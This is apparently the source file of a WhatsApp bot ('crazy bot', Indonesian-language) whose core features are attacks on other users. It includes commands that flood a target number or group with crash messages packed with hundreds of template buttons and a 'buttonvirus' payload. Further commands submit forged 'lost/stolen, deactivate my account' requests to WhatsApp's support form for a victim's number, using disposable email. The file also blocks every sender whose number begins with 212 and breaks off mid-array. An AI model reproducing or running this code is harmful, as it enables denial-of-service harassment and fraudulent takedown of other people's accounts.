const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El crazy'
global.ownerNumber = ["0@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
wait: 'Wait Sis Please be patient',
succes: 'Good Luck Sis ?',
admin: 'Group Admin Special Features!!!',
botAdmin: 'Bots Must Be Admins First!!!',
owner: 'Lu Siapa Kocak?',
group: 'Features Used Only For Groups!!!',
private: 'Features Used Only For Private Chat!!!',
bot: 'Bot Number User Special Features!!!',
error: 'Error Sis, Please Chat Owner...',
}

module.exports = crazy = async (crazy, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await crazy.decodeJid(crazy.user.id)
const itsMecrazy = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
const hariRaya = new Date('January 1, 2023 00:00:00')
const sekarang = new Date().getTime()
const Selisih = hariRaya - sekarang
const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await crazy.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
} catch (err) {
console.error(err)
}

if (!crazy.public) {
if (!m.key.fromMe) return
}

if (!m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (m.sender.startsWith('212')) return crazy.updateBlockStatus(m.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp

async function replyNya(teks) {
   const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }] 
   const buttonMessage = { 
text: teks, 
footer: "", 
templateButtons: buttonsDefault, 
image: {url: ppnyauser}   
   }
   return crazy.sendMessage(from, buttonMessage)
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true,
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `crazy`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

async function styletext(teks) {
return new Promise((resolve, reject) => {
axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
.then(({ data }) => {
let $ = cheerio.load(data)
let hasil = []
$('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
})
resolve(hasil)
})
})
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return crazy.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'menu':
textot = `𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉
∥ ۞ Nama BOT: Billa BOT
∥ ۞ Platform: Panel 
∥ ۞ Library: Baileys MD
∥ ۞ Bot Aktif Selama: ${runtime(process.uptime())}

『 𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 』
∣• bugmenu
∣• rules
∣• owner
∣• ping
∣• boost
∣• runtime
∣• stats

『 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 』
 NOTE : KHUSUS OWN
• add number/tag @
• del number/tag @

- ᴄʀᴀᴢʏ ʙᴏᴛ
`
crazy.sendMessage(from,{ image: {url : "https://telegra.ph/file/f957073ff44a06b65855d.jpg"},caption: textot },{ quoted: crazy.chat })
break
case 'bugmenu':
textot = `𝘽𝙐𝙂𝙈𝙀𝙉𝙐
∥ ۞ VERSION : Beta
∥ ۞ Platform: Panel 
∥ ۞ Library: Baileys MD

『 𝐕𝐢𝐫𝐮𝐬 𝐓𝐞𝐱𝐭 』
• ${prefix}damnikavirus 62xxx
• ${prefix}gustavvirus 62xxx
• ${prefix}wolfvirus 62xxx
• ${prefix}liztavirus 62xxx

『 𝐁𝐮𝐠 𝐂𝐡𝐚𝐭 』
• ${prefix}🌷 62xxx
• ${prefix}🔥 62xxx
• ${prefix}💣 62xxx
• ${prefix}bugpc 62xxx
• ${prefix}bugchat 62xxx
• ${prefix}santet 62xxx
 
 『 𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 』
• ${prefix}🎁 Linkgc
• ${prefix}👊 Linkgc
• ${prefix}💥 Linkgc
• ${prefix}buggc Linkgc
• ${prefix}santetgc Linkgc
• ${prefix}otwgc Linkgc

『 𝐁𝐮𝐠 𝐕𝐞𝐫𝐢𝐟 』
• ${prefix}🤪 62xxx
• ${prefix}👋 62xxx
• ${prefix}verif 62xxx
• ${prefix}kenon 62xxx
• ${prefix}ban 62xxx


- ᴄʀᴀᴢʏ ʙᴏᴛ
`
crazy.sendMessage(from,{ image: {url : "https://telegra.ph/file/f957073ff44a06b65855d.jpg"},caption: textot },{ quoted: crazy.chat })
break
         
case 'add':
case 'addakses':
 if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isGroupAdmins) return m.reply(`sorry anda sepertinya bukan pemilik bot`)

if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await crazy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'del':
case 'delakses':
if (!isGroup) return m.reply(`wajib dalam grup`)
if (!isGroupAdmins) return m.reply(`sorry anda sepertinya bukan pemilik bot`)

if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case '🤪':
case '👋':
case 'ban':
    case 'kenon':
 case 'verif': {
    if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
 if (!isGroupAdmins) return m.reply(`sorry wilayah admin`)
    var axioss = require ("axios")
    let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "ID")
  form.append("phone_number", q)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Perdido/roubado: desative minha conta")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
      cookie
    }
  })
  m.reply(`DONE ${command} By Crazy Bot
Jika Nomer Masih Aktif No Tersebut Sudah Terkena ${command} Sebelumnya`)
  }
 break
    case 'stats' : {
        m.reply(`💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`)
    }
        break
    case 'runtime' : 
        {
            m.reply(` BOT AKTIF SELAMA : ${runtime(process.uptime())} `)
        }
        break
case 'owner':{
crazy.sendContact(m.chat, owner, m)
}
break
    case 'ping':
        case 'boost':
        {
            await
            m.reply(`Sedang Mempercepat ${command}`)
            await
            m.reply(`SUCCES MEMPERCEPAT BOT MENJADI ${latensi.toFixed(4)} DETIK`)
        }
        break
    case 'rules': {
        m.reply(`BOT RULES
- 1 DILARANG SPAM/CALL/VC
- 2 WAJIB SUBREK CHANNEL
- 3 BALIK LAGI KE POINT 2
`) }
        break
        case '🔥':
        case '💣':
        case '🌷':
            case 'santet':
        case 'bugchat':
    case 'bugpc': {  if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)           
        txts = `Succes ✅ "TUNGGU 2 MENIT YA KONTOL UNTUK KIRIM SANTET LAGI" <== DIBACA!!!`
        m.reply(txts)
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
for (let i = 0; i < jumlah; i++) {
crazy.sendMessage(num, {
text: 'BUG BY crazy', 
templateButtons: [
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},

{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ callButton: { displayText: `Affah Iyah`, phoneNumber: ``}},
{ urlButton: { displayText: `Affah Iyah`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quickReplyButton: { displayText: `Affah Iyah`, id: ``}},
{ quoted: crazy.chat }
]})}
await sleep(ms(waktu))
    }
      break      
      case '🎁':
      case '👊':
      case '💥':
      case 'santetgc':
case 'otwgc':
  case 'buggc':{
   if (!itsMecrazy) return m.reply(`So Asik Gembel`)
if (!isGroupAdmins) return m.reply(`sorry wilayah admin`)
m.reply(`otw bos`)
if (!q) return m.reply(`Penggunaan ${prefix+command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "5"
for (let i = 0; i < jumlah; i++) {
let kir = await crazy.groupAcceptInvite(result)
crazy.sendMessage(kir, {
text: 'BUG BY crazy', 
templateButtons: [
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
